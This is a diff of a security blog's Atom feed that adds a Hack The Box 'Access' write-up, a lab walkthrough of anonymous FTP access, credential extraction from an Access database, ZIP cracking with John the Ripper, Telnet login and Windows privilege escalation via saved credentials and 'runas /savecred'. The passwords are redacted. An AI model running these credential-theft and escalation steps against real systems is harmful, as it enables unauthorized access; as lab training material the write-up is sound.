@@ -1,4 +1,260 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-23T17:23:10+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-10-24T16:01:58+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">blackhawk0x</title><subtitle>Writeups, malware analysis, and reverse engineering notes by blackhawk0x.</subtitle><author><name>blackhawk0x</name></author><entry><title type="html">Hack The Box: Access</title><link href="http://localhost:4000/posts/access/" rel="alternate" type="text/html" title="Hack The Box: Access" /><published>2026-10-24T00:00:00+05:30</published><updated>2026-10-24T00:00:00+05:30</updated><id>http://localhost:4000/posts/access</id><content type="html" xml:base="http://localhost:4000/posts/access/"><![CDATA[<h1 id="htb-access">HTB Access</h1>
+
+<h2 id="1-initial-enumeration">1. Initial Enumeration</h2>
+
+<p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.179</code></p>
+
+<p>An Nmap scan was performed to identify exposed services.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sC -sV -oN nmap.txt 10.129.8.179
+</code></pre></div></div>
+
+<h3 id="results">Results</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Port</th>
+      <th>Service</th>
+      <th>Finding</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>21</td>
+      <td>FTP</td>
+      <td>Microsoft FTP; anonymous login allowed</td>
+    </tr>
+    <tr>
+      <td>23</td>
+      <td>Telnet</td>
+      <td>Microsoft Telnet Server</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Microsoft IIS 7.5; title: MegaCorp</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Anonymous FTP access was the most promising starting point because it allowed access without valid credentials.</p>
+
+<h2 id="2-anonymous-ftp-enumeration">2. Anonymous FTP Enumeration</h2>
+
+<p>Connected to the FTP service:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.129.8.179
+</code></pre></div></div>
+
+<p>Logged in using the <code class="language-plaintext highlighter-rouge">anonymous</code> account and enumerated the available directories.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backups/
+Engineer/
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">Backups</code> directory contained <code class="language-plaintext highlighter-rouge">backup.mdb</code>, while <code class="language-plaintext highlighter-rouge">Engineer</code> contained a password-protected archive named <code class="language-plaintext highlighter-rouge">Access Control.zip</code>.</p>
+
+<p>Downloaded both files:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>get backup.mdb
+get "Access Control.zip"
+</code></pre></div></div>
+
+<p>The database was useful because it contained application user records. The ZIP archive appeared to contain additional information that could lead to credentials.</p>
+
+<h2 id="3-extracting-credentials-from-the-database">3. Extracting Credentials from the Database</h2>
+
+<p>The Microsoft Access database was enumerated using <code class="language-plaintext highlighter-rouge">mdb-tools</code>.</p>
+
+<p>First, list the available tables:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdb-tables ./backup.mdb
+</code></pre></div></div>
+
+<p>The output included an <code class="language-plaintext highlighter-rouge">auth_user</code> table, which looked relevant to authentication.</p>
+
+<p>Export the table:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdb-export ./backup.mdb auth_user
+</code></pre></div></div>
+
+<p>Relevant records:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin,[REDACTED]
+engineer,[REDACTED]
+backup_admin,[REDACTED]
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">engineer</code> account’s recovered password was used as a candidate for the password-protected ZIP archive.</p>
+
+<h2 id="4-cracking-the-password-protected-zip">4. Cracking the Password-Protected ZIP</h2>
+
+<p>Initially, the archive was tested with 7-Zip:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>7z x "Access Control.zip"
+</code></pre></div></div>
+
+<p>It requested a password.</p>
+
+<p>A password hash was extracted with <code class="language-plaintext highlighter-rouge">zip2john</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip2john "Access Control.zip" &gt; hash.txt
+</code></pre></div></div>
+
+<p>A small wordlist was created from the database credentials:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[REDACTED]
+[REDACTED]
+</code></pre></div></div>
+
+<p>Then John the Ripper was used:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash.txt --wordlist=./creds.txt
+</code></pre></div></div>
+
+<p>The archive password was recovered: <strong>[REDACTED]</strong></p>
+
+<p>The archive could now be extracted. It contained:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access Control.pst
+</code></pre></div></div>
+
+<p>This demonstrates why credentials discovered in one application should be tested against other files and services in an authorized assessment.</p>
+
+<h2 id="5-recovering-the-security-account-password-from-email">5. Recovering the Security Account Password from Email</h2>
+
+<p>The PST email archive was processed using <code class="language-plaintext highlighter-rouge">readpst</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readpst "Access Control.pst"
+</code></pre></div></div>
+
+<p>This produced <code class="language-plaintext highlighter-rouge">Access Control.mbox</code>.</p>
+
+<p>Inspecting the mailbox revealed an email with the subject:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MegaCorp Access Control System "security" account
+</code></pre></div></div>
+
+<p>The message stated that the password for the <code class="language-plaintext highlighter-rouge">security</code> account had been changed to <strong>[REDACTED]</strong>.</p>
+
+<p>This provided credentials to test against the exposed remote-access service.</p>
+
+<h2 id="6-initial-shell-through-telnet">6. Initial Shell Through Telnet</h2>
+
+<p>The target exposed Microsoft Telnet on TCP port 23.</p>
+
+<p>Connect:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.129.8.179 23
+</code></pre></div></div>
+
+<p>Authenticate with the recovered <code class="language-plaintext highlighter-rouge">security</code> credentials.</p>
+
+<p>Verify the resulting identity:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami
+</code></pre></div></div>
+
+<p>Output:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>access\security
+</code></pre></div></div>
+
+<p>This established an interactive shell as the <code class="language-plaintext highlighter-rouge">security</code> user.</p>
+
+<p>At this stage, the objective was to enumerate the environment for additional credentials, privileged applications, misconfigurations, and accessible files.</p>
+
+<h2 id="7-enumerating-saved-credentials">7. Enumerating Saved Credentials</h2>
+
+<p>While operating as <code class="language-plaintext highlighter-rouge">access\security</code>, inspect Windows Credential Manager entries:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmdkey /list
+</code></pre></div></div>
+
+<p>The output revealed:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Target: Domain:interactive=ACCESS\Administrator
+Type: Domain Password
+User: ACCESS\Administrator
+</code></pre></div></div>
+
+<p>This was a significant finding: Windows had a stored credential entry associated with <code class="language-plaintext highlighter-rouge">ACCESS\Administrator</code>.</p>
+
+<p>However, a stored credential entry alone does not prove that arbitrary processes can successfully reuse it. Further investigation was needed to understand how the credentials were configured to be used.</p>
+
+<h3 id="why-this-matters">Why this matters</h3>
+
+<p>The Windows <code class="language-plaintext highlighter-rouge">runas</code> utility can launch a process under another account. When usable credentials have been saved for that account, the <code class="language-plaintext highlighter-rouge">/savecred</code> option may allow subsequent launches without prompting for the password again.</p>
+
+<p>If a lower-privileged user can reuse saved administrator credentials to run arbitrary commands, this can become a local privilege-escalation path.</p>
+
+<h2 id="8-privilege-escalation-with-runas-savecred">8. Privilege Escalation with <code class="language-plaintext highlighter-rouge">runas /savecred</code></h2>
+
+<p>The saved Administrator credential was the key finding.</p>
+
+<p>The successful test used <code class="language-plaintext highlighter-rouge">runas</code> to launch a command that read the Administrator’s flag and redirected the result into a file accessible to the current user:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>runas /user:Administrator /savecred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt &gt;&gt; C:\Users\security\flag.txt"
+</code></pre></div></div>
+
+<p>The resulting file was then read:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>type C:\Users\security\flag.txt
+</code></pre></div></div>
+
+<p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">[REDACTED]</code></p>
+
+<p>This confirmed access to the protected flag through a command executed using the saved Administrator credentials.</p>
+
+<h2 id="9-sql-server-investigation---separate-lead">9. SQL Server Investigation - Separate Lead</h2>
+
+<p>During enumeration, <code class="language-plaintext highlighter-rouge">C:\temp\scripts\README_FIRST.txt</code> revealed SQL Server connection details:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Server: LOCALHOST
+Authentication: SQL Server Authentication
+Login: sa
+Password: [REDACTED]
+</code></pre></div></div>
+
+<p>The document also described scripts intended to create a <code class="language-plaintext highlighter-rouge">sysdba</code> login, alter server roles, attach a database, modify database authorization, configure firewall ports, and change directory access rules.</p>
+
+<p>These findings were worth investigating, but the available notes do not establish that the SQL Server path was required to obtain the flag. The documented successful escalation was through saved Administrator credentials.</p>
+
+<h2 id="10-attack-chain-summary">10. Attack Chain Summary</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Anonymous FTP
+      |
+      v
+Download backup.mdb and Access Control.zip
+      |
+      v
+Export auth_user credentials
+      |
+      v
+Crack ZIP using a recovered application password
+      |
+      v
+Extract PST email archive
+      |
+      v
+Recover security account password
+      |
+      v
+Telnet login as access\security
+      |
+      v
+Enumerate stored Windows credentials
+      |
+      v
+Discover ACCESS\Administrator credential entry
+      |
+      v
+Reuse saved credentials with runas /savecred
+      |
+      v
+Read Administrator's root.txt
+</code></pre></div></div>]]></content><author><name>blackhawk0x</name></author><category term="htb" /><category term="windows" /><category term="telnet" /><category term="MDB" /><category term="PST" /><category term="Saved-Credentials" /><summary type="html"><![CDATA[HTB Access]]></summary></entry><entry><title type="html">Hack The Box: Delivery</title><link href="http://localhost:4000/posts/delivery/" rel="alternate" type="text/html" title="Hack The Box: Delivery" /><published>2026-10-23T00:00:00+05:30</published><updated>2026-10-23T00:00:00+05:30</updated><id>http://localhost:4000/posts/delivery</id><content type="html" xml:base="http://localhost:4000/posts/delivery/"><![CDATA[<h1 id="htb-delivery">HTB Delivery</h1>
 
 <p><strong>Target:</strong> <code class="language-plaintext highlighter-rouge">10.129.8.154</code><br />
 <strong>Operating System:</strong> Linux (Debian)<br />
